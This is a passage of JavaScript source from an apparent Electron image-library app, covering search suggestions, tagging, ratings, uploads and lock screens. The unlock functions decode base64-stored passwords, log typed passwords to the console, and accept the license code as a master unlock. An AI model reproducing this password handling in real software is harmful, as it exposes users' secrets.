                                        if ($scope.libraryModificationTime && image.lastModified && image.lastModified < $scope.libraryModificationTime) {
                                            image.folders = [];
                                            $scope.unfiledCount++;
                                        }
                                    }
                                    else if (image.folders[0] === null || image.folders[1] === null) {
										image.folders = [...new Set(image.folders)].filter(function (obj) { return obj != null; });
										if (image.folders.length === 0) {
											$scope.unfiledCount++;
											try {
												electronLog && electronLog.error(`[app] ${image.id} 's folder properity is incorrect[2], move to Uncategorized`);
											} catch (err) {}
										}
                                    }
                                }
                            }

                            if (!image.tags) {
                                image.tags = [];
                            }
                        }

						

                        if (!image.isDeleted && image.tags && image.tags.length > 0) {
                            if (!$scope.lockedImages[image.id]) {
                                image.tags.forEach(function(tag) {
                                    var tagName = tag;
                                    if (tagName.length > 500) return;
                                    var tempTag = tags[tagName];
                                    if (!tempTag) {
                                        tags[tagName] = {
                                            name: tag,
                                            imageCount: 0,
                                            groups: []
                                        };
                                        tempTag = tags[tagName];
                                    }
                                    tempTag.imageCount++;
                                });
                            }
                        }

						if (image.folders && image.folders.length > 0) {
                            for (var i = 0; i < image.folders.length; i++) {
                                if (image.isDeleted) continue;
                                if (image.noPreview) continue;
								if ($scope.lockedImages[image.id]) continue;
                                var folderId = image.folders[i];
                                var folder = $scope.folderMappings[folderId];
                                if (folder) {
                                    if (!defaultFolderCoverIdMap[folderId]) {
                                        defaultFolderCoverIdMap[folderId] = image.id;
                                    }
                                }
                            }
                        }
                    }

                    // 計算當前資料有哪些檔案類型
                    var extList = [];
                    Object.keys(exts).map(function(key) {
                        extList.push(key);
                    });

                    extList = extList.sort();
                    eagle.filter.filterTypes = [...extList, ...eagle.filter.buildInTypes];
                    eagle.filter.filterTypes = [...new Set(eagle.filter.filterTypes)];

                    // 如果祖先门没有封面，补上封面
                    eagle.utils.tree.walk($scope.folders, 'children', function(folder, parent) {
                        try {
                            let converId = folder.coverId || defaultFolderCoverIdMap[folder.id];
                            if (!folder.covers) folder.covers = [];
                            if (converId && $scope.itemMappings[converId]) {
                                var coverImage = $scope.itemMappings[converId];
                                var thumbnailPath = FileUrlHelper.getThumbnailUrl(coverImage);
                                let pos = "";
                                if (coverImage.fontMetas) {
                                    pos = `center`;
                                }
                                else if (AUDIO_TYPES[coverImage.ext]) {
                                    pos = `audio center;`;
                                }
                                folder.covers[0] = `<img class="sub-folder-cover ${pos}" src="${thumbnailPath}" style="aspect-ratio: ${coverImage.width / coverImage.height};">`;
                                if (!parent?.covers?.length) {
                                    parent.covers = [`<img class="sub-folder-cover ${pos}" src="${thumbnailPath}" style="aspect-ratio: ${coverImage.width / coverImage.height};">`];
                                }
                            }
                            if (folder.covers.length == 0) {
                                folder.children.forEach(function (child) {
                                    Array.prototype.push.apply(folder.covers, child.covers);
                                    if (folder.covers.length > 3) return;
                                });
                            }
                        }
                        catch (err) {}
                    });

                    // 初始化 Tags
                    TagManager.rawdata = Object.keys(tags).map(function(key) {
                        if (!pinyinCache[key]) {
                            if (_.isString(tags[key].name)) {
                                pinyinCache[key] = tinyPinyin.convertToPinyin(tags[key].name);
                            }
                        }
                        tags[key].pinyin = pinyinCache[key];
                        return tags[key];
                    });

                    TagManager.calculateTags();
                    $scope.tags = TagManager.rawdata;

                    if (!$scope.tags) {
                        $scope.tags = [];
                    }

                    console.timeEnd("calculateImageBinding");
                    if (callback) {
                        callback();
                    }
                }
                catch (err) {
                    electronLog && electronLog.error(err.stack || err);
                }
            }, duration);
        };

        

        $scope.hexToRGB = function(hex, alpha) {
            var r = parseInt(hex.slice(1, 3), 16),
                g = parseInt(hex.slice(3, 5), 16),
                b = parseInt(hex.slice(5, 7), 16);
            return [r, g, b];
        }

        $scope.rgbToHex = function(r, g, b) {
            if (r === undefined) {
                return false;
            }
            return "#" + ((1 << 24) + (r << 16) + (g << 8) + b).toString(16).slice(1).toUpperCase();
        }

        $scope.rgbArrayToHex = function(colors) {
            if (!colors) return "transparent";
            var [r, g, b] = colors;
            if (r === undefined) {
                return false;
            }
            return "#" + ((1 << 24) + (r << 16) + (g << 8) + b).toString(16).slice(1).toUpperCase();
        }


        $scope.currentIndex = function() {
            if (!$scope.allData) return undefined;
            return $scope.allData.indexOf($scope.selected[0]) + 1;
        };

        $scope.appUnlockPassword = "";

        $scope.lockApp = function () {
            $rootScope.isAppLocked = true;
            $rootScope.initMenu();
            setTimeout(function () {
                $scope.focusAppUnlockPassword();
            }, 100);
        };

        $scope.focusAppUnlockPassword = function () {
            $("#app-lock-password-input").focus();
            $("#app-lock-password-input").on("blur", () => {
                $("#app-lock-password-input").focus();
            });
        }

        $scope.unlockAppPasswordKeydown = function (event) {
            event && event.stopPropagation();
            return false;
        };

        $scope.unlockAppPasswordKeyup = function (event) {

            var keyCode = event.keyCode;
            var password = $rootScope.preferences.privacy.password;
            var typingPassword = $("#app-lock-password-input").val();
            var currentPassword = window.atob(password);

            if (keyCode === 13) {

                $timeout(function () {
                    console.log(typingPassword);
                    if (
                        typingPassword === currentPassword || 
                        Registration && Registration.license && typingPassword && typingPassword === Registration.license.code
                    ) {
                        $rootScope.isAppLocked = false;
                        $("#app-lock-password-input").val("");
                        $rootScope.initMenu();
                    }
                    else {
                        $("#app-lock-password-input").addClass("animation--shake-horizontal constant");
                        setTimeout(function () {
                            $("#app-lock-password-input").removeClass("animation--shake-horizontal constant");
                        }, 350);
                    }
                }, 10);
            }
        };

        $scope.focusUnlockPassword = function () {
            $("#lock-password-input").focus();
        }

        $scope.unlockPasswordKeyup = function (event) {

            var keyCode = event.keyCode;
            var folder = $scope.currentFolder;
            var currentPassword = window.atob(folder.password);

            if (keyCode === 13) {
                console.log($scope.unlockPassword);
                if (
                    $scope.unlockPassword === currentPassword ||
                    Registration && Registration.license && $scope.unlockPassword && $scope.unlockPassword === Registration.license.code
                ) {
                    $scope.currentFolder.isUnLock = true;
                    $scope.isLoading = true;
                    $scope.updateSidebarList();
                    $scope.calculateImageBinding({ ignoreSort: true }, function () {
                        $scope.reload();
                        $scope.updateSelection();
                        $scope.isLoading = false;
                        $scope.unlockPassword = "";
                    });
                }
                else {
                    $("#lock-password-input").addClass("animation--shake-horizontal constant");
                    setTimeout(function () {
                        $("#lock-password-input").removeClass("animation--shake-horizontal constant");
                    }, 350);
                }
            }
        };

        $scope.focusSeach = function() {
            $("#search").focus().select();
            $scope.showSuggestions = true;
        };

        $scope.focusSidebarSearch = function () {
            $("#folder-search").focus().select();
        };

        $scope.searchInAll = function () {
            $scope.openAll(true, function () {
                $scope.focusSeach();
            });
        };

        var searchTimeout;
        var keywordModelTimeout;
        $scope.search = function() {
            $timeout.cancel(keywordModelTimeout);
            keywordModelTimeout = $timeout(function () {
                if ($scope.keyword === undefined) return;
                if ($scope.viewMode !=='alltags') {
                    var keyword = $scope.keyword.toLowerCase();
                    $scope.isContainAlphabet = keyword.match(/^[A-Za-z0-9]+$/);
                    
                    let keywordStr = keyword.toLowerCase();
                    let fullmatchTerms = keywordStr.match(/"(.+?)"/g) || [];

                    keywordStr = keywordStr.replaceAll(/"(.+?)"/g, "");
                    $scope.keywords = keywordStr.split(" ");
                    $scope.keywords = [...$scope.keywords, ...fullmatchTerms];
                    $scope.keywords = $scope.keywords.filter((t) => { return t && t !== "" });

                    if (keyword && !$scope.isContainAlphabet) {
                        $scope.keywords_cn = chineseConvert.tw2cn(keyword).split(" ");
                        $scope.keywords_tw = chineseConvert.cn2tw(keyword).split(" ");
                    }
                    else {
                        $scope.keywords_cn = [];
                        $scope.keywords_tw = [];
                    }
                    updateSuggestions();
                    $scope.startCursor = 0;
                    $scope.filterContent();
                    $scope.calculateFilterCounts();
                }
                else {
                    $scope.TagManager.renderTagsResult();
                }
                clearTimeout(searchTimeout);
                searchTimeout = setTimeout(function () {
                    if (keyword) {
                        analytics.event('Search', 'Keyword', keyword);
                    }
                }, 1000);
            }, $scope.keywordDebounce);
        };

        $scope.searchFocus = function () {
            // 標籤管理模式下，不需要顯示搜尋建議
            if ($scope.viewMode === 'alltags') return;
            if (rectSelecting) return;
            updateSuggestions();
            $scope.showSuggestions = true;
        };

        $scope.removeSeachKeyword = function (event, keyword) {
            event && event.stopPropagation();
            if (keyword) {
                var idx = $scope.historySearchKeywords.indexOf(keyword);
                if (idx > -1) {
                    $scope.historySearchKeywords.splice(idx, 1);
                    updateSuggestions();
                    localStorage.setItem("historySearchKeywords", JSON.stringify($scope.historySearchKeywords));
                    $timeout(function () {
                        $scope.focusSeach();
                    }, 200);
                }
            }
        };

        $scope.searchBlur = function() {
            var keyword = $scope.keyword;
            // 记录使用者输入的关键字，添加至历史记录
            $timeout(function() {
                $scope.showSuggestions = false;
                if (keyword && $scope.historySearchKeywords.indexOf(keyword) === -1) {
                    $scope.historySearchKeywords.unshift(keyword);
                    // 最多留下 100 个历史记录
                    if ($scope.historySearchKeywords.length > 100) {
                        $scope.historySearchKeywords.length = 100;
                    }
                    localStorage.setItem("historySearchKeywords", JSON.stringify($scope.historySearchKeywords));
                }
            }, 200);
        };

        $scope.seachKeyup = function(event) {
            var keyCode = event.keyCode;
            if (keyCode === 38) {
                event.preventDefault();
                if ($scope.searchIndex === 100) {
                    $scope.searchIndex = $scope.keywordSuggestions.length - 1;
                }
                else if ($scope.searchIndex - 1 >= 0) {
                    $scope.searchIndex = $scope.searchIndex - 1;
                } else {
                    $scope.searchIndex = -1;
                    $("#search").focus();
                }
            } else if (keyCode === 40) {
                event.preventDefault();
                if ($scope.searchIndex + 1 < $scope.keywordSuggestions.length) {
                    $scope.searchIndex = $scope.searchIndex + 1;
                }
                // 如果有搜寻记录，那就让第一个搜寻记录 active
                else if ($scope.hsks.length > 0) {
                    if ($scope.searchIndex > 99) {
                        if ($scope.searchIndex < 99 + $scope.hsks.length) {
                            $scope.searchIndex++;
                        }
                    }
                    else {
                        $scope.searchIndex = 100;
                    }
                }
            } else if (keyCode === 27) {
                event.preventDefault();
                if ($scope.showSuggestions) {
                    $scope.showSuggestions = false;
                    return;
                }
                else {
                    if ($scope.keyword === "") {
                        $("#search").blur();
                    }
                    else {
                        $scope.keyword = "";
                        $("#search").blur();
                        $scope.rebindRefresh();
                    }
                }
            } else if (keyCode === 13) {
                if ($scope.searchIndex < 100) {
                    $scope.selectSuggestion($scope.searchIndex);
                }
                else {
                    $scope.selectHistoryKeyword($scope.searchIndex - 100);
                }
                $("#search").blur();
            }
            else {
                $scope.showSuggestions = true;
            }
        };

        function updateSuggestions() {
            console.time("updateSuggestions");
            $scope.searchIndex = -1;

            var keyword = "";
            if ($scope.keyword) {
                keyword = $scope.keyword.toLowerCase();
            }

            $scope.hsks = $scope.historySearchKeywords.filter(function (word) {
                if (!keyword || keyword == "") return true;
                if (word) {
                    return fuzzy_match(word, keyword).length > 0;
                }
                return false;
            }).slice(0,8);

            var suggestions = [];
            var wordsIndex = {};
            var dataset = [];
            var currPageTags = [];
            var allCount = $bodyScope.all.length;
            $scope.containTags.forEach(function (tag) {
            	if (tag.imageCount && !tag.isNoTags) {
	            	currPageTags.push({
	            		word: tag.name.toLowerCase(),
	            		weight: tag.imageCount,
	            	})
            	}
            });

            if (!keyword) {
                // 推薦關鍵字，暫時移除，感覺多餘了
            	// suggestions = currPageTags;
            	// suggestions.forEach(function (suggestion) {
	        	// 	wordsIndex[suggestion.word] = suggestion.weight;
	        	// });

	        	// // 去重复
	            // var duplicatesMap = {};
	            // suggestions = suggestions.filter(function (suggestion) {
	            // 	if (!duplicatesMap[suggestion.word]) {
	            // 		duplicatesMap[suggestion.word] = true;
	            // 		return true;
	            // 	}
	            // 	return false;
	            // });

            	// suggestions = suggestions.sort(function(a, b) {
	            //     if(a.weight > b.weight) return -1;
	            //     if(a.weight < b.weight) return 1;
	            //     return 0;
	            // });

	            // if (suggestions.length > 5) {
	            //     suggestions.length = 5;
	            // }
            	$scope.keywordSuggestions = suggestions;
                $scope.keywordSuggestions = $scope.keywordSuggestions.filter((suggestion) => {
                    return $scope.hsks.indexOf(suggestion.word) === -1 && suggestion.word;
                });
            	console.timeEnd("updateSuggestions");
            	return;
            }

            if ($scope.globalKeywords && $scope.globalKeywords.length) {
            	dataset = currPageTags.concat($scope.globalKeywords);
            }

            $scope.keyword_cn = chineseConvert.tw2cn(keyword);
            $scope.keyword_tw = chineseConvert.cn2tw(keyword);
            $scope.isKeywordTW = keyword === $scope.keyword_tw;
            $scope.isKeywordCN = keyword === $scope.keyword_cn;
            $scope.isEnglish = $scope.isKeywordTW === $scope.isKeywordCN;

            if (keyword.length === 1 && $scope.isContainAlphabet) {
                suggestions = dataset.filter(function(suggestion) {
                    return keyword.toLowerCase() === suggestion.word[0].toLowerCase();
                });
            }
            else {
                suggestions = dataset.filter(function(suggestion) {
                    var idx = suggestion.word.toLowerCase().indexOf(keyword);
                    if ($scope.isEnglish) {
                        return (idx > -1);
                    }
                    else if ($scope.isKeywordTW) {
                        return (idx > -1) && (suggestion.word != keyword) ||
                        (suggestion.word.indexOf($scope.keyword_cn) > -1)
                    }
                    else if ($scope.isKeywordCN) {
                        return (idx > -1) && (suggestion.word != keyword) ||
                        (suggestion.word.indexOf($scope.keyword_tw) > -1)
                    }
                });
            }

            suggestions.forEach(function (suggestion) {
        		wordsIndex[suggestion.word] = suggestion.weight;
        	});

            suggestions = suggestions.sort(function(a, b) {
                if(a.weight > b.weight) return -1;
                if(a.weight < b.weight) return 1;
                return 0;
            });

            // 去重复
            var duplicatesMap = {};
            suggestions = suggestions.filter(function (suggestion) {
            	if (!duplicatesMap[suggestion.word]) {
            		duplicatesMap[suggestion.word] = true;
            		return true;
            	}
            	return false;
            });

            if (suggestions.length > 5) {
                suggestions.length = 5;
            }
            
            if (suggestions.length > 0) {
                if (suggestions.length === 1 && suggestions[0].word == $scope.keyword) {

                }
                else {
                    // $scope.showSuggestions = true;
                }
            }
            else {
                $scope.showSuggestions = false;
            }

            $scope.keywordSuggestions = suggestions;
            console.timeEnd("updateSuggestions");
        }

        $scope.hoverSuggestion = function(index) {
            $scope.searchIndex = index;
        };

        $scope.hoverHistory = function(index) {
            $scope.searchIndex = index + 100;
        };

        $scope.selectSuggestion = function(index) {
            if ($scope.keywordSuggestions[index]) {
                $scope.keyword = $scope.keywordSuggestions[index].word;
                $scope.showSuggestions = false;
                $scope.search($scope.keyword);
                $("#search").blur();
            }
        };

        $scope.selectHistoryKeyword = function(index) {
            if ($scope.hsks[index]) {
                $scope.keyword = $scope.hsks[index];
                updateSuggestions();
                $scope.showSuggestions = false;
                $scope.search($scope.keyword);
                $("#search").blur();
            }
        };

        $scope.keywordSuggestSearchOrder = function(suggestion) {
            if (!$scope.keyword) return;
            var sum = 0;
            var firstB = 0;
            $("<div></div>").append(fuzzy_match(suggestion.word, $scope.keyword)).contents().each(function(idx) {
                if (this.tagName == 'B') {
                    if (sum == 0) {
                        firstB = idx;
                    }
                    sum -= Math.pow(2, 10 - idx + firstB);
                }
            });
            return sum;
        };

        

        $scope.openLink = function() {
            if ($scope.selected.length > 0) {
                var targets = $scope.selected.slice(0, 20);
                targets.forEach(function (target) {
                    if (target.url) {
                        if (target.url.indexOf("file://") > -1) {
                            if (process.platform == 'darwin') {
                                var filePath = target.url.replace('file:///', '/').replace('file://', '/');
                                ipcRenderer.send('open-with-default', decodeURIComponent(filePath));
                            }
                            else {
                                var filePath = target.url.replace('file:///', '').replace('file://', '');
                                ipcRenderer.send('open-with-default', decodeURIComponent(path.normalize(filePath)));
                            }
                        }
                        else if (is.url(target.url)) {
                            if (!target.url.match(/^[a-zA-Z]+:\/\//)) {
                                shell.openExternal('http://' + target.url);
                            }
                            else {
                                shell.openExternal(target.url);
                            }
                        }
                        else if (fs.existsSync(target.url)) {
                            ipcRenderer.send('open-with-default', target.url);
                        }
                        else if (target.url.indexOf("://") > -1) {
                            shell.openExternal(target.url);
                        }
                        try { electronLog && electronLog.info(`[app] Open ${target.name}(${target.id}) source link: ${target.url}`); } catch (err) {};
                    }
                })
            }
        };

        $scope.removeFromFolder = function(event, folderId) {

            if (event && event.stopPropagation) {
                event.stopPropagation();
            }

            if (!folderId && $scope.selected.length <= 0) return;

            var origins = [];

            $scope.selected.forEach(function(image) {
                var idx = image.folders.indexOf(folderId);
                if (idx !== -1) {
                    origins.push(image);
                    image.folders.splice(idx, 1);
                }
            });

            try {
                electronLog && electronLog.info(`[app] Remove ${$scope.selected.length} files from ${$scope.folderMappings[folderId].name}(${folderId})`);
            } catch (err) {};
            
            ayncsImagesChange($scope.selected);
            hiddenByCurrentFilter($scope.selected);

            var message = angular.element(document.body).injector().get('$filter')('i18n')("notify.image.removeFromFolder", [
                { "property": "imageCount", "value": $scope.selected.length },
                { "property": "folderName", "value": $scope.folderMappings[folderId].name }
            ]);

            if ($scope.selected.length === 1) { message = message.replace("images", "image"); }

            // 自動選取下一個圖片，如果沒有下一個，選上一個，都沒有就空
            if ($scope.currentFolder && $scope.currentFolder.id === folderId) {
                $scope.lastIndex = $scope.getSelection().start;
                var next = $scope.allData[$scope.lastIndex + $scope.selected.length];
                var prev = $scope.allData[$scope.lastIndex - 1];
                if (next) {
                    $scope.selected = [next];
                    if ($scope.isDetailMode) {
                        $scope.current = next;
                    }
                } else if (prev) {
                    $scope.selected = [prev];
                    if ($scope.isDetailMode) {
                        $scope.current = prev;
                    }
                } else {
                    $scope.selected = [];
                    $scope.leaveDetailMode();
                }

                if ($scope.isDetailMode) {
                    $timeout(function() {
                    	$scope.forceFitImageSize($scope.current);
    	                $scope.zoom();
    	            }, 100);
                }
	            ScrollbarSaver.saveScrollPosition();

                var itemElements = $scope.getSelectedItemElements();
                $rootScope.$broadcast("gl:removeItems", itemElements);
            }

            if ($rootScope.preferences.notification.soundEffect.enable != 'false' && $rootScope.preferences.notification.soundEffect.when.deleteImage == 'true') {
                $scope.removeSound.play();
            }

            $scope.calculateImageBinding({ ignoreSort: true }, function() {
                $scope.rebindRefresh(true);
                $scope.updateSelection();
            });

            $rootScope.notify({
                message: message,
                duration: 5000,
            }, function() {
                origins.forEach(function(image) {
                    if (image.folders.indexOf(folderId) === -1) {
                        image.folders.push(folderId);
                        image.folders = [...new Set(image.folders)];
                    }
                });

                // 如果這張圖片就在這個資料夾，畫面需要更新
                if ($scope.currentFolder && $scope.currentFolder.id === folderId) {
                    $scope.calculateImageBinding({ ignoreSort: true }, function() {
                        $scope.rebindRefresh();
                        $scope.updateSelection();
                    });
                } else {
                    $scope.updateSelection();
                    $scope.rebindRefresh(true);
                }

                ayncsImagesChange(origins);
            });
        };

        $scope.openFilter = function () {
            if (!eagle.filter.isOpen) {
                eagle.filter.isOpen = true;
                $scope.updateContainerHieght(true);
            }
        };

        $scope.toggleTagFilter = _.throttle(function toggleTagFilter (event) {
            event && event.preventDefault();
            $scope.openFilter();
            $("#tags-filter-item").click();
        }, 300);

        $scope.toggleFolderFilter = _.throttle(function toggleFolderFilter (event) {
            event && event.preventDefault();
            $scope.openFilter();
            $("#folders-filter-item").click();
        }, 300);

        $scope.toggleColorFilter = _.throttle(function toggleColorFilter (event) {
            event && event.preventDefault();
            $scope.openFilter();
            $("#color-filter-item").click();
        }, 300);

        $scope.toggleRatingFilter = _.throttle(function toggleRatingFilter (event) {
            event && event.preventDefault();
            $scope.openFilter();
            $("#rating-filter-item").click();
        }, 300);

        $scope.toggleShapeFilter = _.throttle(function toggleShapeFilter (event) {
            event && event.preventDefault();
            $scope.openFilter();
            $("#shape-filter-item").click();
        }, 300);

        $scope.toggleDateFilter = _.throttle(function toggleDateFilter (event) {
            event && event.preventDefault();
            $scope.openFilter();
            $("#import-filter-item").click();
        }, 300);

        $scope.toggleTypeFilter = _.throttle(function toggleTypeFilter (event) {
            event && event.preventDefault();
            $scope.openFilter();
            $("#types-filter-item").click();
        }, 300);

        $scope.duplicateItem = function (event) {
            event && event.preventDefault();
            event && event.stopPropagation();
            if ($scope.selected[0]) {
                ipcRenderer.send('duplicate-file', $scope.selected[0].id);
            }
        };

        $scope.copyTags = _.throttle(() => {
            eagle.inspector.copyTags();
            $scope.notify({
                message: $filter('i18n')("Context.Tag.Copy.Success"),
                duration: 750
            });
        }, 500);

        $scope.pasteTags = function(event) {
            event && event.preventDefault();
            event && event.stopPropagation();
            var copiedTags = eagle.inspector.copiedTags;
            if ($scope.selected && $scope.selected.length > 0 && copiedTags && copiedTags.length > 0) {
                $scope.selected.forEach(function (image) {
                    copiedTags.forEach(function (tag) {
                        if (image.tags.indexOf(tag) === -1) {
                            image.tags.push(tag);
                        }
                    });
                });
                $scope.updateSelection();
                ayncsImagesChange($scope.selected);
                hiddenByCurrentFilter($scope.selected);
                electronLog.info(`[app] Paste tags ${JSON.stringify(copiedTags)} to ${$scope.selected.length} files`);
            }
        };

        $scope.removeStar = function () {
            $scope.changeStar(undefined, true);
        };

        $scope.removeStarGoNext = function () {
            $scope.changeStar(undefined, true);
            $scope.selectNext();
        };

        $scope.changeTo1StarGoNext = function () {
            $scope.changeStar(1, false, true);
            $scope.selectNext();
        };

        $scope.changeTo2StarGoNext = function () {
            $scope.changeStar(2, false, true);
            $scope.selectNext();
        };

        $scope.changeTo3StarGoNext = function () {
            $scope.changeStar(3, false, true);
            $scope.selectNext();
        };

        $scope.changeTo4StarGoNext = function () {
            $scope.changeStar(4, false, true);
            $scope.selectNext();
        };

        $scope.changeTo5StarGoNext = function () {
            $scope.changeStar(5, false, true);
            $scope.selectNext();
        };

        $scope.changeTo1Star = function (event) {
            if (event?.altKey || event?.metaKey || event?.ctrlKey) return;
            $scope.changeStar(1, true, true);
        };

        $scope.changeTo2Star = function (event) {
            if (event?.altKey || event?.metaKey || event?.ctrlKey) return;
            $scope.changeStar(2, true, true);
        };

        $scope.changeTo3Star = function (event) {
            if (event?.altKey || event?.metaKey || event?.ctrlKey) return;
            $scope.changeStar(3, true, true);
        };

        $scope.changeTo4Star = function (event) {
            if (event?.altKey || event?.metaKey || event?.ctrlKey) return;
            $scope.changeStar(4, true, true);
        };

        $scope.changeTo5Star = function (event) {
            if (event?.altKey || event?.metaKey || event?.ctrlKey) return;
            $scope.changeStar(5, true, true);
        };

        $scope.changeStar = function (star, showNotify, force) {
            if ($scope.selected.length === 0) return;
            if (!star && $scope.selected.length === 1 && !$scope.selected[0].star) {
            	return;
            }

            $scope.checkOperationSafety(function () {

                let changedItems = [];

                // 刪除星星
                if (star === undefined || (eagle.inspector.star === star && !force)) {
                    for (var i = 0; i < $scope.selected.length; i++) {
                        let image = $scope.selected[i];
                        if (image.star) {
                            eagle.filter.filterCounts['rating']['0']++;
                            eagle.filter.filterCounts['rating']['' + image.star]--;
                            delete image.star;
                            changedItems.push(image);
                        }
                    }
                    delete eagle.inspector.star;
                    if (showNotify) {
                        $scope.notify({
                            message: $filter('i18n')('appmenu.tag>removeRating'),
                            duration: 750
                        });
                    }
                    electronLog && electronLog.info(`[app] Remove rating, total: ${changedItems.length} files`);
                    analytics.event('Rating', 'Remove');
                }
                else {
                    for (var i = 0; i < $scope.selected.length; i++) {
                        let image = $scope.selected[i];
                        if (image.star !== star) {
                            eagle.filter.filterCounts['rating']['' + image.star]--;
                            image.star = star;
                            eagle.filter.filterCounts['rating']['' + star]++;
                            eagle.filter.filterCounts['rating']['0']--;
                            changedItems.push(image);
                        }
                    }
                    eagle.inspector.star = star;
                    var message = $filter('i18n')("notify.setStar.msg", [
                        { "property": "star", "value": star }
                    ]);
                    if (showNotify) {
                        $scope.notify({
                            message: message,
                            duration: 750
                        });
                    }
                    electronLog && electronLog.info(`[app] Add ${star} star, total: ${changedItems.length} files`);
                    analytics.event('Rating', 'Set', star);
                }
                $scope.updateItemsView($scope.selected);
                if (changedItems.length > 0) {
                    ayncsImagesChange(changedItems);
                    hiddenByCurrentFilter(changedItems);
                }
            });
        };

        $scope.imagesChange = function() {
            $scope.$broadcast("INSPECTOR_SAVE_CHANGES");
        };

        $rootScope.addFiles = function($files, folder) {
            if ($files[0].type == "" && $files[0].name != "") return;
            if (!dragging) {
                if ($files.length > 0) {
                    if (folder) {
                        $scope.openFolder(folder);
                    }
                    $scope.uploadFiles($files, folder);
                }
            } else {
                dragging = false;
            }
        };

        ipcRenderer.on('image-processing-error', function(e, errorItem) {

            // 针对特定文件提供错误帮助
            if (errorItem && errorItem.object) {
                var obj = errorItem.object;
                var ext = obj.ext;
                if (obj.reason && obj.reason.indexOf("UNKNOWN: unknown error") > -1) {
                    errorItem.reason = i18n.__("modal.importError.reason.unknown");
                }
            }

            // 针对特定类型（超时）提供错误帮助
            $scope.errorList.push(errorItem);
            if ($scope.errorList.length === 1) {
            	if ($rootScope.preferences.notification.soundEffect.enable != 'false') {
	                $scope.errorSound.play();
                    $scope.openErrorModal();
	            }
	            setTimeout(() => {
	            	ipcRenderer.send('show-inactive');
	            }, 500);
            }
            $scope.$evalAsync();
        });

        ipcRenderer.on('file-uploaded', function(e, image) {

            if (image && image.id && image.ext) {
                $scope.lastestAddItem = image;
                $scope.itemMappings[image.id] = image;
                // 判斷是否重複，如果重復，就先紀錄在 $scope.duplicateQueue 裡面
                var existsImage = $scope.isDuplicateImage(image);
                var needCheckRepeat = $rootScope.preferences.notification.notification.when.repeatImage === 'true';

                if (existsImage && needCheckRepeat) {
                    // 使用 md5 判断是否真的重复
                    try {
                        // 旧图片的 md5
                        var existsPath = FileUrlHelper.getRawPath(existsImage);
                        var existsBuff = readChunk.sync(existsPath, 0, 4096000);

                        // 新图片的 md5
                        var newPath = FileUrlHelper.getRawPath(image);
                        var newBuff = readChunk.sync(newPath, 0, 4096000);

                        if (existsBuff.equals(newBuff)) {
                            $scope.duplicateQueue.push(image);
                        }
                        else {
                            if ($scope.raw) { $scope.raw.unshift(image); }
                            $scope.addToDuplicateMapping(image);
                        }
                    }
                    catch (err) {
                        if ($scope.raw) { $scope.raw.unshift(image); }
                        $scope.itemMappings[image.id] = image;
                        $scope.addToDuplicateMapping(image);
                        electronLog && electronLog.error(err.stack || err);
                    }
                }
                // 否則添加至列表中
                else {
                    if ($scope.raw) { $scope.raw.unshift(image); }
                    $scope.addToDuplicateMapping(image);
                }

                switch (image.ext) {
                    case '360':
                    case 'mp4':
                    case 'mov':
                    case 'webm':
                    case 'mkv':
                    case 'avi':
                    case 'wmv':
                    case 'mpg':
                        eagle.filter.filterExtensions['video'] = true;
                        break;
                    case 'ppt':
                    case 'pptx':
                    case 'potx':
                        eagle.filter.filterExtensions['powerpoint'] = true;
                        break;
                    case 'doc':
                    case 'docx':
                        eagle.filter.filterExtensions['word'] = true;
                        break;
                    case 'xls':
                    case 'xlsx':
                        eagle.filter.filterExtensions['excel'] = true;
                        break;
                    case 'ttf':
                    case 'otf':
                    case 'ttc':
                    case 'woff':
                    case 'woff2':
                        eagle.filter.filterExtensions['font'] = true;
                        break;
                    default:
                        eagle.filter.filterExtensions[image.ext] = true;
                }
            }

            $scope.finishQueue.push(image);

            // Note: 故意不使用 async 来更新画面，加速画面性能
            var progress = $scope.finishQueue.length/$scope.uploadQueue.length;
            $("#upload-queue-progress").find(".message .percentage").html($scope.finishQueue.length + "/" + $scope.uploadQueue.length);
            $("#upload-queue-progress").find(".current").width(progress*100 + "%");

            if (progress < 0.97) {
            	updateWindowProgressBar(progress);
            }
            else {
            	updateWindowProgressBar(-1);
            }

            // 仅更新包含此图片的列表
            if ($scope.finishQueue.length === $scope.uploadQueue.length) {
                $scope.calculateImageBinding({}, function () {
                    $scope.$evalAsync();
                });
            }
            else {
                muteCalcuteImageBinding({ ignoreSort : true }, function () {
                    $scope.$evalAsync();
                });
            }
        });

        var prependImagesTimeout;
        $scope.prependImages = function (images, updateView) {

            for (var i = 0; i < images.length; i++) {
                $scope.itemMappings[images[i].id] = images[i];
            }

            if (images[0].id) {
                $scope.allData.unshift(images[0]);
                clearTimeout(prependImagesTimeout);
                prependImagesTimeout = setTimeout(function () {
                    resetImageData(images);
                }, 500);
            }
        }

        var resetImageData = function  (images) {
            if ($scope.viewMode == "all" || ($scope.currentFolder && images[0].folders[0] && images[0].folders.indexOf($scope.currentFolder.id) > -1) || (images[0].folders && images[0].folders.length === 0 && $scope.viewMode == "unfiled") ) {
                resetNgGridLayoutData($scope.allData, 0);
                $scope.$evalAsync();
            }
        };

        ipcRenderer.on('calculateImageBinding', function () {
            $scope.calculateImageBinding({}, function() {
                muteRebind();
                $scope.updateSelection();
            });
            $scope.$evalAsync();
        });

        ipcRenderer.on('new-folders', function(e, folders) {

            folders.forEach(function(f) {
                $scope.folders.push(f);
            });

            $scope.updateSidebarList();

            $scope.calculateImageBinding({ ignoreSort: true }, function() {
                $scope.rebindRefresh();
                $scope.$evalAsync();
                $scope.saveFolder();
            });

            $scope.saveFolder();
            electronLog && electronLog.info(`[app] New ${folders.length} folders`);
        });

        $scope.isDuplicateImage = function(image) {
            if (!$scope.duplicateMappings) return false;
            if (image.ext === 'svg') return false;
            if (image.ext === 'tif') return false;
            if (image.ext === 'tiff') return false;

            var hashID = getHashID(image);
            if (!hashID) return false;
            // 垃圾桶文件不纳入考量
            if ($scope.duplicateMappings[hashID] && $scope.duplicateMappings[hashID].isDeleted) return false;
            return $scope.duplicateMappings[hashID];
        };

        $scope.addToDuplicateMapping = function(image) {
            var hashID = getHashID(image);
            if (!$scope.duplicateMappings) $scope.duplicateMappings = {};
            $scope.duplicateMappings[hashID] = image;
        };

        $scope.removeFromDuplicateMapping = function(image) {
            var hashID = getHashID(image);
            delete $scope.duplicateMappings[hashID];
        };

        $scope.uploadDraggingBoard = function(folder, dragUrl) {
            var folders = folder && [folder.id] || [];
            var tags = folder && folder.extendTags || [];
            $scope.uploadQueue.push({});
            $scope.$evalAsync();
            IPCHelper.send('upload-dragging-board', {
                folders: folders,
                tags: tags,
                name: getFilenameFromUrl(dragUrl) || guid(),
                dragUrl: dragUrl
            });
        };

